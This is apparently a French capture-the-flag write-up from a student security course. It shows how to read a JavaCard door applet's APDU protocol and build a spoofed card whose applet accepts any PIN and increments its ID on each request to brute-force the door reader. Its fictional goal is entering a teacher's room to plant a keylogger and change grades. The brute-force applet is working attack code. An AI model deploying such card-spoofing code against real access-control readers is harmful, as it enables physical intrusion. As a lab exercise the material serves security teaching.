# Attaque sur le lecteur de carte

## 1. Rappel du sujet

***La mission est d'entrer dans la salle des 4AS (option à l'INSA CVL en STI) affaint de pouvoir brancher un Keylogger sur la machine de l'enseignant et pouvoir récupérer sont mot de passe pour pouvoir changer ça note obtenue et avoir la moyenne. Comme vous ête dans l'option 2SU, vous avez une porte qui mène directement dans la salle des 4AS, mais cette enseignant, suite à des problème entre des éleves à mis en place un système de carte surveillé par une caméra pour que seulement les profésseur puissent passer par la porte.***

***Pour pouvoir ouvrir la porte, il faut utiliser une carte avec le lecteur de carte. L'ouverture de la porte se fait que lorsque la carte est reconnue, que personnes n'est devant la caméra, qu'il n'y a pas de coupure réseau.***

Maintenant que nous avons la possibilité de passer devant la caméra sans être détecté, nous devons maintenant trouver un moyen d'ouvrir la porte qui s'active à l'aide d'une carte à puce. Dans cette étapes, nous avons réussie à obtenir le code d'une carte utilisé par un anseignant. Cette dernière carte à étais désactivé ce qui rend le code inutile en l'état. Il faut donc trouver un moyen d'exploiter ce code pour pouvoir ouvrir la porte.

## 2. Attaque sur le lecteur de carte

### 2.1. Compréhension du code de la carte

Dans cette partie, nous allons vusialiser comment une carte à puce fait pour communiquer avec un lecteur de carte. Puis nous allons visualiser le code de la carte d'un anciant enseignant.

#### 2.1.1. Fonctionnement de la communication entre terminal et carte à puce

Dans cette section, nous allons voir le fonctionnement entre les cartes à puce et les terminaux de manière simplifier pour pouvoir réaliser ce challenge.

Pour commencer, nous allons introduire le principe de client/serveur, car en effet dans ces communication, le terminal est un client qui intérroge la carte qui joue le role de serveur. Pour exemple lorsque vous faite un achat avec votre carte banquaire, le terminal vous demande votre code PIN, puis va la transmettre à la carte et c'est cette dernière qui va vérifier si le code est bon ou non et répondre au client. Dans le cas d'une communication avec un code PIN, il existe une librairie pour les carte à puce qui permet de bloquer la carte celon le nombre de tentative faite.

Il faut donc visualiser la carte comme un serveur. De plus, la carte ne posséde pas de RAM comme un PC stantard, cette mémoire est sauvegarder. Il est donc possible de débrancher une carte, puis en la rebranchant, elle peut reprendre l'exécution de son code l'état des données avant de l'avoir débranché.

Nous parlons d'`applet` un code présent dans la carte. Il faut par ailleur l'instansier pour que l'applet puisse être exécuté, ce qui permet d'avoir plusieur exécution d'un même `applet` en simultané.

Ce qui nous intéresse pour ce challenge se sont les requêtes et réponse `APDU` qui permet de faire la communication entre le client et le serveur. Un trame se constitue de la manière suivante:

```text
CLA INS P1 P2 LC --data-- LE
```

- CLA: permet de désigner l'applet avec lequel nous dialoguons.
- INS: permet de choisir une instruction dans l'applet
- P1 et P2: sont des paramètres que nous donnons celons l'instruction applet (si non nécéssaire, la valeur de P1 et P2 sont à 0x00)
- LC: permet de donner le nombre de donné présent dans la section --data--
- --data--: contient des données que nous pouvons transmettre à l'applet pour des données plus importante que P1 et P2
- LE: est le nombre d'octet que nous attendons recevoire. Si ne connaisons pas le nombre de donnée transmit, nous pouvons donnée `0x7F` qui permet de récupérer toute le buffer que la carte peut transmettre en une requête.

Par exemple si nous avons une instance qui à pour identifiant `0x80`, une instruction pour vérifier un code PIN avec la valeur `0x22`, qui ne prend pas de paramètre dans P1 et P2, mais qui prend le le code dans les données (chaque numéro du code sont dans un octet différent) et ne retourne pas de donnée, nous aurons la requête `APDU` suivante (cette exemple sera présent dans ce challenge):

```text
0x80 0x22 0x00 0x00 0x04 0x01 0x02 0x03 0x04 0x00
CLA  INS  P1   P2   LC   ------ CODE ------- LE

Le code ici est 1234
```

Pour la réponse par le serveur est sous la forme:

```text
--data-- SW1 SW2
```

- --data--: est la donnée tranmit par le serveur en fonction de l'instruction
- SW1 et SW2: est le code de retour de l'exécution de la carte, l'objectif est d'obtenir `0X9000` pour ne pas avoir d'erreur sinon ... non il ne faut pas avoir autre chose, sinon il faut trouver le type de retour dans les documentations

Par rapport à notre exemple, la réponse que nous aurons:

```text
si la PIN est correcte:
  0x90 0x00
  SW1  SW2

si la réponse est incorrect:
  0x63 0x00
  SW1  SW2

  cela dépent le code retour dans le code cette valeur est utilisé dans le code de ce challenge
```

Pour finir, les applets ont un `AID` qui permet de les différencier dans une carte, mais il y a aussi un `AID` lors de l'instanciation de l'applet.

#### 2.1.2. Identification du code de la carte

Nous pouvons visualiser dans le projet JavaCard le fichier `.jcproject`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
<comment>Java Card project properties</comment>
<entry key="door">0x01:0x02:0x03:0x04:0x05:0x06:0x07:0x08:0x09:0x00</entry>
<entry key="door.Door">0x01:0x02:0x03:0x04:0x05:0x06:0x07:0x08:0x09:0x00:0x01</entry>
</properties>
```

Ce fichier nous permet de savoir que l'applet à comme AID `0x01:0x02:0x03:0x04:0x05:0x06:0x07:0x08:0x09:0x00` et l'instance à pour AID `0x01:0x02:0x03:0x04:0x05:0x06:0x07:0x08:0x09:0x00:0x01`.

Nous pouvons maintenant visualiser le code pour identifier le fonctionnement. Pour commencer, nous avons les déclaration suivante :

```java
	private final static byte ID_CARD_CLA =(byte)0x80;
	
	private static final byte VALIDATE_PIN_INS = 0x22;
	private static final byte GET_ID_INS       = 0x23;
```

Cela nous permet de déterminer que le `CLA` de cette applet est `0x80` et que nous avons deux instructions. La première instruction qui permet de valider le code PIN à pour valeur `0x22` et la seconde instruction qui permet de récupérer un id avec l'instruction `0x23`.

Nous avons ensuite la méthode `process` qui permet de sélection la fonction adapté en fonction de l'instruction sélectionné.

```java
	public void validatePin(APDU apdu) {
		byte[] buffer = apdu.getBuffer();
		if(buffer[ISO7816.OFFSET_LC]==PIN_SIZE){
			apdu.setIncomingAndReceive();
			if(pin.check(buffer, ISO7816.OFFSET_CDATA,PIN_SIZE)==false)
				ISOException.throwIt(SW_VERIFICATION_FAILED);
		}else ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
	}
```

La méthode `validatePin` permet de vérifier le code PIN transmis. La carte va transmetre une erreur si le code ne correspond pas. En cas de validation du PIN, la carte transmet `0x9000`. Le code est transmis dans la trâme avec la valeur de `LC` et pas dans les paramètre `P1` et `P2`

```java
	public void getId(APDU apdu) {
		if(!pin.isValidated()) ISOException.throwIt(SW_PIN_VERIFICATION_REQUIRED);

		apdu.setOutgoing();
		apdu.setOutgoingLength((short) 1);
		apdu.sendBytesLong((byte[]) id, (short) 0, (short) 1);
	}
```

Pour finir, nous avons la méthode `getId` qui permet de transmettre l'id de la carte seulement lorsque le code PIN à étais vérifier au préalable.

Avec ces éléments, nous pouvons donc déterminé que les requêtes APDU transmis par le lecteur de carte doivent être les suivantes:

```text
Requête APDU pour valider le code PIN:

	0x80 0x22 0x00 0x00 0x04 0x00 0x00 0x00 0x00 0x7F
	CLA  INS  P1   P2   LC   --------CODE------- LE

Reqyête APDU pour récupérer l'ID de la carte:

	0x80 0x23 0x00 0x00 0x00 0x7F
	CLA  INS  P1   P2   LC   LE
```

Pour l'ordre des apples des requêtes APDU sont par déduction la validation du code PIN, puis si il n'y a pas d'erreur, la récupération de l'ID de la carte.

```java
	final static byte PIN_TRY_LIMIT = (byte) 0x03;
	private final static byte PIN_SIZE =(byte)0x04;

	private Door() {
		// initialisation du code pin de la carte
		pin = new OwnerPIN(PIN_TRY_LIMIT, MAX_PIN_SIZE);
		pin.update(new byte[]{0x01,0x05,0x08,0x03},(short) 0, PIN_SIZE);
		register();
	}
```

Il est aussi intéréssant à noter que dans la méthode `Door`, le système de code PIN est limité à trois tentative en cas d'erreur de code PIN et que le code est constitué de quatre nombre.

Avec ces informations, nous avons ce qu'il faut pour produire une carte qui permet d'ouvrir la porte. Mainteant il faut mettre en place l'environnement de développement sur sa machine.

### 2.2. Mis en place de l'envirronement de développement JavaCard

Dans cette section, nous allons voir comment mettre en place un environnement de travail qui permet de développer en `JavaCard` avec `Eclipse`. Pour se faire, au préalable il faut installer `Eclipse`, la suite va partir du principe que cela est réalisé. Il faut de plus installer `openjdk`.

Pour commencer, il faut installer les librairies suivantes :
```bash
apt install -y libusb-1.0-0-dev libpcsclite1 pcscd pcsc-tools
```

Une fois l'installation faite, il mettre en place `Java Card Development Kit 2.2.2` sur votre machine. Pour cela vous pouvez utiliser le fichier disponible dans le répertoire ressources [`java_card_kit-2_2_2-linux.zip`](./ressources/java_card_kit-2_2_2-linux.zip), ou bien le télécharger via oracle via le lien [oracle.com](https://oracle.com/java/technologies/java-archive-downloads-javame-downloads.html#javacardkitv222). Il faut décompresser l'archive, puis aller dans le dossier `java_card_kit-2_2_2-linux/java_card_kit-2_2_2/`. Dans ce répertoire se trouve plusieurs archive, il faut déarchiver `java_card_kit-2_2_2-rr-bin-linux-do.zip` puis avec un terminal se rendre dans le contenue déarchiver, et faire les manipulation suivante :

```bash
mkdir ~/jcdk/
cp -r . ~/jcdk/
cd ~/jcdk/bin
chmod +x *
```

Nous devons maintenant mettre en place un plugin à `Eclipse`. Le plusgin est disponible dans les ressources [`eclipse-jcde-0.1.zip`](./ressources/eclipse-jcde-0.1.zip) ou bien disponible sur [sourceforge.net](https://sourceforge.net/projects/eclipse-jcde).

Il faut décomprésser le contenue de cette archive, puis se rendre dans le répertoire extrait, puis exécuter les commande suivante ***en appliquant des changements celon les noms des répertoire de votre machine***

```bash
mv * ~/eclipse/java-2023-06/eclipse/dropins/
```

Nous allons maintenant installer un programme `gp` qui permet d'intéragir avec un lecteur de carte pour transmettre des codes. Pour cela il faut utiliser le fichier dans les ressources [`gp.jar`](./ressources/gp.jar) ou bien le télécharger sur github via le lien [github.com](https://github.com/martinpaljak/GlobalPlatformPro/releases/tag/v20.01.23) et suivre les commandes suivante

```bash
cp gp.jar ~/jcdk/
```

A ce stade, nous avons le plugins ajouté à `Eclipse`. Il faut maintenant appliquer des modifications dans le fichier `~/.profile`:

```bash
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ]; then
	PATH="$HOME.local/bin:$PATH"
fi

# set JC_HOME, JAVA_HOME, PATH
export JC_HOME="$HOME/jcdk"
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64 # a modifier celon la machine
export PATH="$PATH:$JAVA_HOME/bin:$JC_HOME/bin"
alias gp="java -jar $HOME/jcdk/gp.jar"
```

Une fois cela effectuer, il faut exécuter la commande suivante :

```bash
source ~/.profile
```

A ce stade, nous pouvons vérifier l'installation des différents éléments. Pour cela, il faut brancher un lecteur de carte à votre machine puis faire les tests suivantes:

Vérification de la l'installation de jcdk:

```bash
$ pcsc_scan
PC/SC device scanner
V 1.6.2 (c) 2001-2022, Ludovic Rousseau <ludovic.rousseau@free.fr>
Using reader plug n play mechanism
Scanning present readers...
0: Feitian SCR301 00 00

Tue Jan 9 17:21:24 2024
 Reader 0: Feitian SCR301 00 00
  Event number: 0
  Card state: Card inserted,
  ATR: 3B 94 95 81 01 46 54 56 00 C5

...

```

Si un lecteur de carte est détécté, alors l'installation de jcdk et des différent driver sont bien installer.

Vérification de l'installation de gp:
```bash
$ gp --list
Warning: no keys given, using default test key 404142434445464748494A4B4C4D4E4F
ISD: A000000003000000 (OP_READY)
...

```

Cette commande permet de vérifier que gp fonctionne et permet de lister les applets disponible dans la carte à puce.

Vérification du plugin d'`Eclipse`:
Pour cela, il faut ouvrir `Eclipse`, puis lors de la création d'un nouveau projet, vous devez avoir la possibilité de créer un projet `Java Card Project`.

Si avec toute ces étapes les tests des différentes installations fonctionnent, il ne vous reste plus qu'à suivre l'étape suivante qui permet de résourde le challenge avec des différentes installation de faite.

### 2.3. Pret a ouvrir cette porte

#### 2.3.1 Création du code de brutforce en JavaCard

Nous allons maintenant pouvoir écrire le code qui permet d'ouvrir la porte. Comme nous l'avons vu précédaement, le code dans la carte fournie, nous avons une vérification d'un code PIN, puis nous avons la demande d'un ID.

Nous pouvons donc faire une carte qui posséde ces même instruction, mais nous pouvons changer le comportement des instruction sans changer la réponse.

Dans notre cas, nous allons faire en sorte que peut importe le mot de passe donnée à la carte, la réponse serat toujours `0x9000`, puis pour l'id, nous allons faire en sorte de donner l'id `1`, puis à l'appel suivant de cette instruction d'incrémenter l'id pour pouvoir faire un brutforce des id.

Dans le répertoire `srcs` se trouve le code qui permet de faire le brutforce de la porte. Pour pouvoir utiliser l'environnement que nous avons créer, nous allons voir pas à pas comment obtenir un fichier que nous pourrons transmettre à la carte qui pourra brutforcer les id.

Pour commencer, il faut créer un nouveau projet dans `Eclipse`, en faisant `File > New > Other ...`. Dans la liste des projet que nous pouvons réaliser, nous devons choisir `Java Card > Java Card Project`. Puis donner le nom du projet comme `BrutforceDoor`. Puis lorsque vous faite `Finish` vous allez avoir une erreur, il faut donner le chemin de `JCDK` donc vous faite `OK`, puis une fenêtre va s'ouvrir, et vous choisissez le répertoir dans `$HOME/jcdk`, puis vous faite `Apply and Close`. Vous aurrez donc le projet qui serra créer.

Nous devons maintenant suivre les étapes suivante: `clique droit sur le projet > Properties > Java Compiler` et cocher la case `Enable project specific setting`, puis changer le `Compiler compliance level` pour avoir la version `1.3`. Puis vous pouvais faire `Apply and Close`.

Il ne nous reste plus qu'une étapes avant de pouvoir faire le code du brutforce. Dans le répertoire du projet il y a un dossier qui se nomme `src`, `faite un clique droit dessue > New > Other > Java Card > Java Card Applet`, puis vous luis donner le nom de `BrutforceDoor` avec comme nom de package `brutforceDoor`. Il ne reste plus qu'a donner les `AID` trouvé précedament. Pour cela `clique droit sur le package > Java Card Tools > Set Package AID`, puis donner l'AID trouver (par défaut, l'`AID` est le même vous n'avais pas à le changer), puis `clique droit le le fichier java > Java Card Tools > Set Applet AID` puis donner l'`AID` trouvé (pour celui-ci il faut changer le dernier octet en `0x01`).

Nous pouvons maintenant coder le brutforce. Le code est disponible [dans le répertoire srcs](./srcs/BrutforceDoor/src/brutforceDoor/BrutforceDoor.java), nous allons visualiser les fonctions principale de ce code car la base de ce code est le même que le code fournie.

Pour commencer, nous avons les déclaration suivante

```java
	private final static byte code_lock_id[] = {(byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04};
	private final static byte code_reste_id[] = {(byte)0x04, (byte)0x03, (byte)0x02, (byte)0x01};
	
	private final static byte ID_CARD_CLA =(byte)0x80;
	
	private static final byte VALIDATE_PIN_INS = 0x22;
	private static final byte GET_ID_INS       = 0x23;

	private final static short SW_OK_PASSE_TOUT_VA_BIEN = (short)0x9000;
```

Les deux premier vons nous permettre de pour bloquer l'id contenue dans la carte pour pouvoir ré-ouvrir la porte de manière ilimiter, et de pouvoir aussi reset la carte et recommencer le brutforce. Nous gardons les valeurs pour les instruction est le CLA de l'applet. Nous avons aussi un short qui à pour valeur `0x9000` qui sera utilisé lors de la vérification du code PIN.

Le code contenue dans la méthode `process` reste exactement pareil que le code d'origine. Nous allons maintenant visualiser les deux méthode appeler par le terminal.

```java
	public void validatePin(APDU apdu) {
		byte[] buffer = apdu.getBuffer();
		byte[] code = {0x00, 0x00, 0x00, 0x00};
		short i;
		
		for (i=0; i < 4; i++)
			code[(short)i] = (byte)buffer[(short)((short)ISO7816.OFFSET_CDATA + (short)i)];
		
		if ((byte)code[0] == (byte)code_lock_id[0] &&
			(byte)code[1] == (byte)code_lock_id[1] &&
			(byte)code[2] == (byte)code_lock_id[2] &&
			(byte)code[3] == (byte)code_lock_id[3])
			lockId = true;
		
		if ((byte)code[0] == (byte)code_reste_id[0] &&
			(byte)code[1] == (byte)code_reste_id[1] &&
			(byte)code[2] == (byte)code_reste_id[2] &&
			(byte)code[3] == (byte)code_reste_id[3]) {
				lockId = false;
				id[0] = (byte)0x00;
		}
		
		ISOException.throwIt(SW_OK_PASSE_TOUT_VA_BIEN);
	}
```

Cette premier méthode permet de vérifier si le code PIN est bon, dans notre cas, nous validons toujours le code PIN, mais lorsque nous recevons `1234`, nous bloquons l'incrementation de l'id, et lorsque nous recevons `4321`, nous remetons à zéro l'id et nous débloquons son incrémentation pour reset la carte.

```java
	public void getId(APDU apdu) {
		if (!lockId)
			id[0] = (byte)((byte)id[0] + (byte)1);
		
		apdu.setOutgoing();
		apdu.setOutgoingLength((short) 1);
		apdu.sendBytesLong((byte[]) id, (short) 0, (short) 1);
	}
```

Pour finir, la méthode `getId` va transmettre son id comme le code d'origine à la différence que nous ne vérifions pas si le PIN à étais dévérouiller, de plus, nous ajoutons 1 à l'id si l'incrémentation n'est pas vérouillé.

#### 2.3.2. Transmitions du code dans la carte à puce

Nous pouvons donc maintenant compiler ce code est le transmettre dans la carte. Pour cela, nous allons faire `clique droit sur le package > Java Card Tools > Generate Script` de cette manière, nous avons un autres package qui est présent `brutforceDoor.javacard` qui contient différent fichier, celui qui nous faut est `brutforceDoor.cap`.

Il faut maintenant, avec un terminal se rendre dans le répertoire qui contient le fichier `brutforceDoor.cap`, puis brancher le lecteur de carte à sont PC, et insérer la carte dans le lecteur de carte. Nous pouvons faire les commandes suivante :

![01_send_cap_file](./imgs/01_send_cap_file.png "01_send_cap_file")

De cette manière, nous avons une instance qui contient bien l'`AID` que nous avons attribuer, ce qui permet d'avoir une carte qui du point de vu du terminal se comporte de manière normale.

#### 2.3.3. Ouverture de la porte

Nous pouvons maintenant munit de notre carte de brutforce ouvrir la porte. Pour cela, nous devons l'insérer dans le lecteur de carte disponible dans la raspberry PI, puis reproduire les étapes suivante (dans cette exemple, nous avons utiliser le même code qui se trouve dans la Raspberry PI mais compiler pour fonctionner pour terminal pour cela vous pouvais aller dans le répertoir [../../srcs/rasp_protector/JavaCard/card_reader/](../../srcs/rasp_protector/JavaCard/card_reader/), pour pouvoir le compiler pour terminal, il faut appliquer les changements indiqué dans le Makefile):

![02_brutforce](./imgs/02_brutforce.png "02_brutforce")

Nous avons donc des tentative t'ouverture de porte qui donne l'erreur `Bad ID` car la carte valide le code PIN, jusqu'à ce que nous ayons le message `Door open`, cela indique que nous avons le bon ID. Nous utilisons le code `1234` qui permet de bloquer l'ID ce qui permet de continuer à pouvoir ouvrir la porte. Pour finir nous arrivons à reset la carte avec le code `4321`.

Nous avons donc réussie à ouvrir la porte et à s'introduire dans la salle que nous voulions accéder.
